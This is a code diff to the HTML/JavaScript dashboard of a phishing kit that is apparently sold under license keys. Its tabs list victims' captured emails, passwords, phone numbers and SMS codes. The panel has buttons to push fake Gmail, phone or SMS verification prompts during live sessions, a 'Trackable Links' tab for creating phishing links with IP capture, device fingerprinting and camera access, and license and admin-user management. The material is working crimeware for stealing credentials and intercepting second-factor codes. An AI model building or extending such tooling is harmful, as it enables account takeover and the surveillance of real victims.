@@ -965,10 +965,6 @@ tr:hover td{background:#0e0e0f}
   <!-- SIDEBAR -->
   <div class="sidebar">
     <div class="sidebar-section">Main</div>
-    <a class="sidebar-item active" onclick="switchTab('sessions')" id="tab-sessions-btn">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
-      Active Sessions
-    </a>
     <a class="sidebar-item" onclick="switchTab('completed')" id="tab-completed-btn">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>
       Completed Captures
@@ -1008,5 +1004,156 @@ tr:hover td{background:#0e0e0f}
           <button class="secondary-btn" onclick="clearActive()">Clear Active</button>
         </div>
       </div>
-<!-- ─── LAYOUT ─── -->
-<div class >
+      ${activeSessions.length === 0 ? `<div class="empty-state">No active sessions</div>` : 
+        activeSessions.map(c => `
+        <div class="session-card">
+          <div class="session-header">
+            <span class="session-email">${c.email}</span>
+            <span class="session-name">${c.displayName || ''}</span>
+            <span class="badge-step">${c.step}</span>
+            <span class="session-time">${new Date(c.time).toLocaleString()}</span>
+          </div>
+          <div class="session-body">
+            <div class="session-creds">
+              ${c.password ? `<div class="cred-item"><span class="cred-label">Pass</span><span class="cred-value">${c.password}</span></div>` : ''}
+              ${c.phoneNumber ? `<div class="cred-item"><span class="cred-label">Phone</span><span class="cred-value">${c.phoneNumber}</span></div>` : ''}
+              ${c.smsCode ? `<div class="cred-item"><span class="cred-label">SMS</span><span class="cred-value">${c.smsCode}</span></div>` : ''}
+            </div>
+            <div class="session-actions">
+              <button class="btn btn-gmail" onclick="sendVerification('${c.id}','gmail_app')">Gmail</button>
+              <button class="btn btn-phone" onclick="sendVerification('${c.id}','phone_number_sms')">Phone</button>
+              <button class="btn btn-sms" onclick="sendVerification('${c.id}','phone_sms')">SMS</button>
+              <button class="btn btn-valid" onclick="markVerified('${c.id}')">✓ Verified</button>
+              <button class="btn btn-delete" onclick="deleteSession('${c.id}')">×</button>
+            </div>
+          </div>
+        </div>`).join('')}
+    </div>
+
+    <!-- ═══ COMPLETED TAB ═══ -->
+    <div id="tab-completed" class="tab-content hidden">
+      <div class="page-header">
+        <div>
+          <h2>Completed Captures</h2>
+          <div class="sub">${completedCaptures.length} capture(s) with credentials obtained</div>
+        </div>
+        <div class="flex">
+          <button class="secondary-btn" onclick="clearCompleted()">Clear Completed</button>
+          <button class="danger-btn" onclick="clearAll()">Clear All Data</button>
+        </div>
+      </div>
+      ${completedCaptures.length === 0 ? `<div class="empty-state">No completed captures yet</div>` : `
+      <div class="table-container">
+        <table>
+          <thead><tr><th>Name</th><th>Email</th><th>Password</th><th>Method</th><th>Code</th><th>Campaign</th><th>Time</th><th>Actions</th></tr></thead>
+          <tbody>
+            ${completedCaptures.map(c => `
+              <tr>
+                <td><span class="cell-email">${c.displayName || 'N/A'}</span></td>
+                <td>${c.email}</td>
+                <td><span class="cell-pass">${c.password || 'N/A'}</span></td>
+                <td><span class="badge badge-method">${c.verificationType || 'N/A'}</span></td>
+                <td>${c.smsCode ? `<span class="badge badge-code">${c.smsCode}</span>` : '<span class="muted">—</span>'}</td>
+                <td>${c.campaign || 'general'}</td>
+                <td><span class="cell-time">${new Date(c.time).toLocaleString()}</span></td>
+                <td><button class="btn btn-delete" onclick="deleteSession('${c.id}')">Delete</button></td>
+              </tr>`).join('')}
+          </tbody>
+        </table>
+      </div>`}
+    </div>
+
+    <!-- ═══ LINKS TAB ═══ -->
+    <div id="tab-links" class="tab-content hidden">
+      <div class="page-header">
+        <div>
+          <h2>Trackable Links</h2>
+          <div class="sub">Phishing links with IP capture, device fingerprinting & camera support</div>
+        </div>
+        <button class="primary-btn" onclick="openModal('create-link')">+ Create Link</button>
+      </div>
+      ${Object.keys(links).length === 0 ? `<div class="empty-state">No tracking links created yet</div>` : `
+      <div class="table-container">
+        <table>
+          <thead><tr><th>Name</th><th>Tracking URL</th><th>Redirect</th><th>Camera</th><th>Visits</th><th>Created</th><th>Actions</th></tr></thead>
+          <tbody>
+            ${Object.values(links).map(l => {
+              const visitCount = (visits[l.id] || []).length;
+              return `<tr>
+                <td><span class="cell-email">${l.name}</span></td>
+                <td><span style="font-family:monospace;font-size:11px;color:#8ab4f8">${APP_URL}/t/${l.id}</span>
+                  <button class="copy-btn" onclick="navigator.clipboard.writeText('${APP_URL}/t/${l.id}')">Copy</button>
+                </td>
+                <td style="font-size:11px;color:#5f6368;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${l.redirectUrl}</td>
+                <td>${l.camera ? '<span style="color:#81c995">✓</span>' : '<span class="muted">—</span>'}</td>
+                <td><strong>${visitCount}</strong></td>
+                <td><span class="cell-time">${new Date(l.created).toLocaleDateString()}</span></td>
+                <td>
+                  <button class="btn btn-sms" style="font-size:10px;padding:4px 8px" onclick="viewVisits('${l.id}','${l.name}')">Visits</button>
+                  <button class="btn btn-delete" style="font-size:10px;padding:4px 8px" onclick="deleteLink('${l.id}')">Delete</button>
+                </td>
+              </tr>`;
+            }).join('')}
+          </tbody>
+        </table>
+      </div>`}
+    </div>
+
+    <!-- ═══ LICENSES TAB ═══ -->
+    <div id="tab-licenses" class="tab-content hidden">
+      <div class="page-header">
+        <div>
+          <h2>License Keys</h2>
+          <div class="sub">Generate and manage product license keys</div>
+        </div>
+        <button class="primary-btn" onclick="openModal('create-license')">+ Generate Key</button>
+      </div>
+      ${Object.keys(licenses).length === 0 ? `<div class="empty-state">No license keys generated yet</div>` : `
+      <div class="table-container">
+        <table>
+          <thead><tr><th>License Key</th><th>Duration</th><th>Uses</th><th>Max Uses</th><th>Status</th><th>Note</th><th>Created</th><th>Actions</th></tr></thead>
+          <tbody>
+            ${Object.values(licenses).map(l => `
+              <tr>
+                <td><span class="badge-license">${l.key}</span>
+                  <button class="copy-btn" onclick="navigator.clipboard.writeText('${l.key}')">Copy</button>
+                </td>
+                <td>${l.durationLabel}</td>
+                <td>${l.uses || 0}${l.maxUses > 0 ? ` / ${l.maxUses}` : ' / ∞'}</td>
+                <td>${l.maxUses > 0 ? l.maxUses : 'Unlimited'}</td>
+                <td><span class="badge ${l.active ? 'badge-active' : 'badge-revoked'}">${l.active ? 'Active' : 'Revoked'}</span></td>
+                <td style="font-size:11px;color:#5f6368">${l.note || '—'}</td>
+                <td><span class="cell-time">${new Date(l.created).toLocaleDateString()}</span></td>
+                <td>${l.active ? `<button class="btn btn-delete" onclick="revokeLicense('${l.key}')">Revoke</button>` : '<span class="muted">—</span>'}</td>
+              </tr>`).join('')}
+          </tbody>
+        </table>
+      </div>`}
+    </div>
+
+    <!-- ═══ USERS TAB ═══ -->
+    <div id="tab-users" class="tab-content hidden">
+      <div class="page-header">
+        <div>
+          <h2>Admin Users</h2>
+          <div class="sub">Manage panel administrator accounts</div>
+        </div>
+        <button class="primary-btn" onclick="openModal('create-user')">+ Add User</button>
+      </div>
+      ${Object.keys(users).length === 0 ? `<div class="empty-state">No additional users</div>` : `
+      <div class="table-container">
+        <table>
+          <thead><tr><th>Username</th><th>Role</th><th>Created</th><th>Created By</th><th>Actions</th></tr></thead>
+          <tbody>
+            ${Object.values(users).map(u => `
+              <tr>
+                <td><span class="cell-email">${u.username}</span></td>
+                <td>${u.role || 'admin'}</td>
+                <td><span class="cell-time">${new Date(u.created).toLocaleDateString()}</span></td>
+                <td>${u.createdBy || 'system'}</td>
+                <td>${u.username !== 'spexkzi' ? `<button class="btn btn-delete" onclick="deleteUser('${u.username}')">Delete</button>` : '<span class="muted">Primary</span>'}</td>
+              </tr>`).join('')}
+          </tbody>
+        </table>
+      </div>`}
+    </div>
